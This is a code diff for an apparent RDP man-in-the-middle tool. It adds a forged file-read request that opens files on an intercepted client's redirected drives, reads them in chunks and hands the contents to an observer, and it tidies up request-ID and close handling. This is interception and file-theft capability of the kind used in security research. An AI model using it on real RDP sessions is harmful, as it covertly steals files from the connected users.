@@ -27,10 +27,16 @@ class DeviceRedirectionMITMObserver(Observer):
     def onDeviceAnnounce(self, device: DeviceAnnounce):
         pass
 
-    def onDirectoryListingResult(self, requestID: int, deviceID: int, fileName: str, isDirectory: bool):
+    def onFileDownloadResult(self, deviceID: int, requestID: int, path: str, offset: int, data: bytes):
         pass
 
-    def onDirectoryListingComplete(self, requestID: int, deviceID: int):
+    def onFileDownloadComplete(self, deviceID: int, requestID: int, path: str, error: int):
+        pass
+
+    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
+        pass
+
+    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
         pass
 
 
@@ -262,6 +268,31 @@ class DeviceRedirectionMITM(Subject):
             self.saveMapping()
 
 
+    def findNextRequestID(self) -> int:
+        completionID = DeviceRedirectionMITM.FORGED_COMPLETION_ID
+
+        while completionID in self.forgedRequests:
+            completionID += 1
+
+        return completionID
+
+
+    def sendForgedFileRead(self, deviceID: int, path: str) -> int:
+        """
+        Send a forged requests for reading a file. Returns a request ID that can be used by the caller to keep track of
+        which file the responses belong to. Results are sent by using the DeviceRedirectionMITMObserver interface.
+        :param deviceID: ID of the target device.
+        :param path: path of the file to download. The path should use '\' instead of '/' to separate directories.
+        """
+
+        completionID = self.findNextRequestID()
+        request = DeviceRedirectionMITM.ForgedFileReadRequest(deviceID, completionID, self, path)
+        self.forgedRequests[completionID] = request
+
+        request.send()
+        return completionID
+
+
     def sendForgedDirectoryListing(self, deviceID: int, path: str) -> int:
         """
         Send a forged directory listing request. Returns a request ID that can be used by the caller to keep track of which
@@ -272,11 +303,7 @@ class DeviceRedirectionMITM(Subject):
         \Documents\*
         """
 
-        completionID = DeviceRedirectionMITM.FORGED_COMPLETION_ID
-
-        while completionID in self.forgedRequests:
-            completionID += 1
-
+        completionID = self.findNextRequestID()
         request = DeviceRedirectionMITM.ForgedDirectoryListingRequest(deviceID, completionID, self, path)
         self.forgedRequests[completionID] = request
 
@@ -310,6 +337,16 @@ class DeviceRedirectionMITM(Subject):
         def send(self):
             pass
 
+        def sendCloseRequest(self):
+            request = DeviceCloseRequestPDU(
+                self.deviceID,
+                self.fileID,
+                self.requestID,
+                0
+            )
+
+            self.sendIORequest(request)
+
         def sendIORequest(self, request: DeviceIORequestPDU):
             self.mitm.client.sendPDU(request)
 
@@ -326,6 +363,84 @@ class DeviceRedirectionMITM(Subject):
 
         def onCloseResponse(self, _: DeviceCloseResponsePDU):
             self.complete()
+
+
+    class ForgedFileReadRequest(ForgedRequest):
+        def __init__(self, deviceID: int, requestID: int, mitm: 'DeviceRedirectionMITM', path: str):
+            """
+            :param deviceID: ID of the device used.
+            :param requestID: this request's ID.
+            :param mitm: the parent MITM.
+            :param path: path of the file to download.
+            """
+            super().__init__(deviceID, requestID, mitm)
+            self.path = path
+            self.handlers[MajorFunction.IRP_MJ_READ] = self.onReadResponse
+            self.offset = 0
+
+        def send(self):
+            # Open the file
+            request = DeviceCreateRequestPDU(
+                self.deviceID,
+                0,
+                self.requestID,
+                0,
+                FileAccessMask.FILE_READ_DATA,
+                0,
+                FileAttributes.FILE_ATTRIBUTE_NONE,
+                FileShareAccess(7), # read, write, delete
+                FileCreateDisposition.FILE_OPEN,
+                FileCreateOptions.FILE_NON_DIRECTORY_FILE,
+                self.path
+            )
+
+            self.sendIORequest(request)
+
+        def sendReadRequest(self):
+            request = DeviceReadRequestPDU(
+                self.deviceID,
+                self.fileID,
+                self.requestID,
+                0,
+                4096,
+                self.offset
+            )
+
+            self.sendIORequest(request)
+
+        def onCreateResponse(self, response: DeviceCreateResponsePDU):
+            super().onCreateResponse(response)
+
+            if self.fileID is None:
+                self.handleFileComplete(response.ioStatus)
+                return
+
+            self.sendReadRequest()
+
+        def onReadResponse(self, response: DeviceReadResponsePDU):
+            if response.ioStatus != 0:
+                self.handleFileComplete(response.ioStatus)
+                return
+
+            length = len(response.payload)
+
+            if length == 0:
+                self.handleFileComplete(0)
+                return
+
+            self.mitm.observer.onFileDownloadResult(self.deviceID, self.requestID, self.path, self.offset, response.payload)
+
+            self.offset += length
+            self.sendReadRequest()
+
+        def handleFileComplete(self, error: int):
+            self.mitm.observer.onFileDownloadComplete(self.deviceID, self.requestID, self.path, error)
+
+            if self.fileID is None:
+                self.complete()
+            else:
+                self.sendCloseRequest()
+
 
 
     class ForgedDirectoryListingRequest(ForgedRequest):
@@ -370,6 +485,7 @@ class DeviceRedirectionMITM(Subject):
             super().onCreateResponse(response)
 
             if self.fileID is None:
+                self.complete()
                 return
 
             # Now that the file is open, start listing the directory.
@@ -400,7 +516,7 @@ class DeviceRedirectionMITM(Subject):
                 except AttributeError:
                     isDirectory = False
 
-                self.mitm.observer.onDirectoryListingResult(response.completionID, response.deviceID, info.fileName, isDirectory)
+                self.mitm.observer.onDirectoryListingResult(self.deviceID, self.requestID, info.fileName, isDirectory)
 
             # Send a follow-up request to get the next file (or a nonzero ioStatus, which will complete the listing).
             pdu = DeviceQueryDirectoryRequestPDU(
@@ -415,14 +531,7 @@ class DeviceRedirectionMITM(Subject):
             self.sendIORequest(pdu)
 
         def handleDirectoryListingComplete(self, _: DeviceQueryDirectoryResponsePDU):
-            self.mitm.observer.onDirectoryListingComplete(self.requestID, self.deviceID)
+            self.mitm.observer.onDirectoryListingComplete(self.deviceID, self.requestID)
 
             # Once we're done, we can close the file.
-            request = DeviceCloseRequestPDU(
-                self.deviceID,
-                self.fileID,
-                self.requestID,
-                0
-            )
-
-            self.sendIORequest(request)
+            self.sendCloseRequest()
